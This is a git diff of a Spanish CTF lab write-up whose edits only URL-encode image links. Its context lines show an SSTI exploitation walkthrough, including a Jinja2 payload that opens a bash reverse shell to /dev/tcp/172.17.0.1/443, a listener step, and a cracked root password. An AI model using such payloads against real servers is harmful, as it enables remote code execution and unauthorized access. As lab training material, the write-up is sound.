@@ -4,7 +4,7 @@ Propiedades:
 - Nivel: Easy
 - Tags: #ssti #password-cracking
 
-![](../assets/Pasted image 20251110164053.png)
+![](../assets/Pasted%20image%2020251110164053.png)
 ## Reconocimiento
 
 Comienzo tirando un ping para comprobar conectividad
@@ -79,11 +79,11 @@ Al momento de acceder por el navegador al puerto 8089 me encuentro con una pagin
 http://172.17.0.2:8089/ [200 OK] Country[RESERVED][ZZ], HTTPServer[Werkzeug/2.2.2 Python/3.11.2], IP[172.17.0.2], Python[3.11.2], Title[Dale duro bro], Werkzeug[2.2.2]
 ```
 
-![](../assets/Pasted image 20251110165559.png)
+![](../assets/Pasted%20image%2020251110165559.png)
 
 - Probando la app me doy cuenta que el input del usuario se ve reflejado en la web.
 - El parametro ?user= si lo cambiamos también se ve reflejado en la web.
-![](../assets/Pasted image 20251110165824.png)
+![](../assets/Pasted%20image%2020251110165824.png)
 
 Sabiendo que la web corre en python y el input del usuario se ve reflejado y es lo único que cambia de manera dinámica en la web, esto me hace pensar que puede que por detrás haya un framework como Flask o Django que emplee algún motor plantillas cono Jinja2 u otro que pueda ser vulnerable a SSTI.
 
@@ -93,7 +93,7 @@ Lo primero que intentamos fue cambiar el parametro `?user=` por una operatoria s
 
 `{{7*7}}`
 
-![](../assets/Pasted image 20251110170230.png)
+![](../assets/Pasted%20image%2020251110170230.png)
 
 Ahora sabiendo que en efecto la web es vulnerable a SSTI y que corre en Python mi primer approach fue buscar payloads que me permitieran leer archivos internos como /etc/passwd que sirvieran para el motor de plantillas de Jinja2.
 ```python
@@ -101,7 +101,7 @@ Ahora sabiendo que en efecto la web es vulnerable a SSTI y que corre en Python m
 ```
 
 Aquí me di cuenta que existe un usuario llamado _verde_
-![](../assets/Pasted image 20251110170620.png)
+![](../assets/Pasted%20image%2020251110170620.png)
 
 Ahora procedí a denuevo buscar algún payload pero ahora que me permitiera entablarme una reverse shell.
 
@@ -109,7 +109,7 @@ Ahora procedí a denuevo buscar algún payload pero ahora que me permitiera enta
 > {{ self.__init__.__globals__.__builtins__.__import__('subprocess').Popen('bash -c "bash -i >& /dev/tcp/172.17.0.1/443 0>&1"', shell=True) }}
 ```
 
-![](../assets/Pasted image 20251110171843.png)
+![](../assets/Pasted%20image%2020251110171843.png)
 
 Me pongo en escucha:
 ```bash
@@ -165,7 +165,7 @@ Por lo cual ahora procedo a tratar de romper la contraseña john
 root-key:honda1
 ```
 
-![](../assets/Pasted image 20251110175319.png)
+![](../assets/Pasted%20image%2020251110175319.png)
 
 - Encuentro la clave: root-key:honda1
 
@@ -179,6 +179,6 @@ root@d56c80ae05a3:~# id
 uid=0(root) gid=0(root) groups=0(root)
 root@d56c80ae05a3:~# 
 ```
-![](../assets/Pasted image 20251110175431.png)
+![](../assets/Pasted%20image%2020251110175431.png)
 
 ***PWNED**
